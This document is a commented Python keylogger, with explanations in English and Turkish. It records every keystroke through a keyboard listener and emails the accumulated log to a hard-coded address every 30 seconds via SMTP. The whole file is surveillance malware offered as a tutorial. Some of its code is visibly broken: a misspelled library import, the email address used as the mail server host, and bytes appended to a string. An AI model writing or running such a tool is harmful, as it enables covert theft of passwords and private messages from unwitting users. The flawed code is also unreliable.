import pynut.keyboard as pynut#First of all, we include the library that allows us to detect and save keyboard inputs in our project.--Öncelikle klavye girişlerini tespit etmemizi ve kaydetmemizi sağlayan kütüphaneyi projemize dahil ediyoruz.
import smtplib
import threading
log = ""#We define an empty sring named "log" in order to save the recorded keys in the proper word form.--Kaydedilen anahtarları uygun kelime biçiminde kaydetmek için "log" adında boş bir dizge tanımlarız.

def callback_function(key):#We create a call_back function to process the data sent from pynut_Listener.--Pynput Listener'dan gönderilen verileri işlemek için bir geri çağırma işlevi oluşturuyoruz.
    global log#We express it as "global" while using the log variable we define for use everywhere.--Her yerde kullanmak için tanımladığımız log değişkenini kullanırken bunu "global" olarak ifade ediyoruz.
    try:
        
        log = log + key.char.encode("utf-8")#We encode key.char into utf-8 so that we do not get an error when we get Turkish characters.--Key.char'ı utf-8 olarak kodluyoruz, böylece Türkçe karakterler aldığımızda hata almayız.
        #log = log + str(key.char)#When retrieving data, we use key.char expression to pull only the character parts.--Verileri alırken, sadece karakter kısımlarını çekmek için key.char ifadesini kullanırız.
    except AttributeError:#In order not to get an error in data such as "enter" when only taking the characters, we do "try: except" and take "enter" as strings.--Sadece karakterleri alırken "enter" gibi verilerde hata oluşmaması için "try: exclude" yaparız ve dizge olarak "enter" alırız.
       if key == key.space:
           log = log + " "
       else:    
          log = log + str(key)
    #print(log)
    
def send_email(email,password,message):#We send the recorded results to ourselves by creating an e-mail server.--Kaydedilen sonuçları bir e-posta sunucusu oluşturarak kendimize gönderiyoruz."
    email_server = smtplib.SMTP(email, 587)
    email_server.starttls()
    email_server.login(email, password)
    email_server.sendmail(email, email, message)
    email_server.quit() 


def thread_function():#We create a thread function and create an object containing thread.time in order to continuously save the data and send mail.--Verileri sürekli kaydetmek ve posta göndermek için bir thread fonksiyonu oluşturuyoruz ve thread.time içeren bir nesne oluşturuyoruz.
    global log
    send_email("example@gmail.com", "testtesttest" , log)
    log=""
    timer_object = threading.Timer(30,thread_function)
    timer_object.start()
    
    
key_logger = pynut.Listener(on_press = callback_function)#We create variable using the pynput library Listener module.--Pynput library Listener modülünü kullanarak değişken oluşturuyoruz.

with key_logger:#In order to properly handle unmanaged data streams, we call our key_logger variable in  "with" function.--Yönetilmeyen veri akışlarını düzgün bir şekilde işlemek için, key_logger değişkenimizi "with" işlevinde çağırıyoruz.
    thread_function()
    key_logger.join()